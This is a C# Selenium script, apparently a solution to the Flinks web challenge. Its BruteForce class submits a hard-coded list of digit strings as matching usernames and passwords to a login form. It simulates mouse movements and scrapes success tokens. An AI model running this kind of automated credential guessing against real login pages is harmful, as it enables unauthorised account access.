using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using OpenQA.Selenium;
using OpenQA.Selenium.Firefox;
using OpenQA.Selenium.Chrome;

using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.UI;

namespace flinksChallenge
{
    class BruteForce
    {
        

        public void Attack()
        {
            string[] passwords = { "", "1", "2222", "2", "11", "3", "12", "21", "22", "23", "13", "31", "32", "111", "33", "112", "113", "121", "122", "123", "131", "132", "133", "211", "212", "213", "221", "222", "223", "231", "232", "233", "311", "312", "313", "321", "322", "323", "331", "332", "333", "1111", "1112", "1113", "1121", "1122", "1123", "1131", "1132", "1133", "1211", "1212", "1213", "1221", "1222", "1223", "1231", "1232", "1233", "1311", "1312", "1313", "1321", "1322", "1323", "1331", "1332", "1333", "2111", "2112", "2113", "2121", "2122", "2123", "2131", "2132", "2133", "2211", "2212", "2213", "2221", "2222", "2223", "2231", "2232", "2233", "2311", "2312", "2313", "2321", "2322", "2323", "2331", "2332", "2333", "3111", "3112", "3113", "3121", "3122", "3123", "3131", "3132", "3133", "3211", "3212", "3213", "3221", "3222", "3223", "3231", "3232", "3233", "3311", "3312", "3313", "3321", "3322", "3323", "3331", "3332", "3333"};


            Driver = new FirefoxDriver();
            Driver.Navigate().GoToUrl("https://challenge.flinks.io/");
            System.Threading.Thread.Sleep(5000);
            System.Collections.ObjectModel.ReadOnlyCollection<IWebElement> aTags = Driver.FindElements(By.TagName("a"));

            IWebElement startChallenge = aTags[2];
            IJavaScriptExecutor jsExecuter = (IJavaScriptExecutor)Driver;
            jsExecuter.ExecuteScript("document.getElementsByTagName('a')[2].scrollIntoView(true);", startChallenge);
            Actions action = new Actions(Driver);
            action
            .MoveToElement(startChallenge)
            .Click().Perform();


            foreach (string username in passwords)
            {
                Console.WriteLine("Password: " + username + " username: " + username);
                FillForm(username, username);

                if (IsSuccessfulLogin())
                {
                    while (IsSuccessfulLogin())
                    {
                        ScrapeTokenAndClickBack();
                        FillForm(username, username);

                    }
                }
            }


        }

        private void FillForm(string username , string password)
        {
            Console.WriteLine(Driver.Url);
            System.Threading.Thread.Sleep(500);


            WebDriverWait wait = new WebDriverWait(Driver, TimeSpan.FromSeconds(10));
            IWebElement usernameElement = wait.Until(d => d.FindElement(By.Name("username")));
            IWebElement passwordElement = wait.Until(d => d.FindElement(By.Name("password")));

            usernameElement.SendKeys(username);
            passwordElement.SendKeys(password);


            Actions builder = new Actions(Driver);

            builder.MoveToElement(usernameElement)
            .MoveToElement(passwordElement)
            .MoveToElement(usernameElement)
            .Build()
            .Perform();
            passwordElement.Submit();



        }

        private string ScrapeTokenAndClickBack()
        {
            string token = Driver.FindElements(By.TagName("b"))[0].Text;
            Tokens.Add(token);
            Console.WriteLine("got token: " + token);
            IWebElement backAnchorTag = Driver.FindElement(By.CssSelector("p > a"));

            IJavaScriptExecutor jsExecuter = (IJavaScriptExecutor)Driver;
            jsExecuter.ExecuteScript("document.querySelector('p > a').scrollIntoView(true)");
            Actions successActions = new Actions(Driver);
            successActions.Click(backAnchorTag).Perform();
            return token;
        }

        private bool IsSuccessfulLogin()
        {
            try
            {
                WebDriverWait wait = new WebDriverWait(Driver, TimeSpan.FromSeconds(10));
                return wait.Until(d => d.PageSource.Contains("Congrats! You are in."));
            }
            catch {
                return false;
            }

        }


        private IWebDriver Driver { get; set; }
        private List<string> Tokens = new List<string>();
    }
}
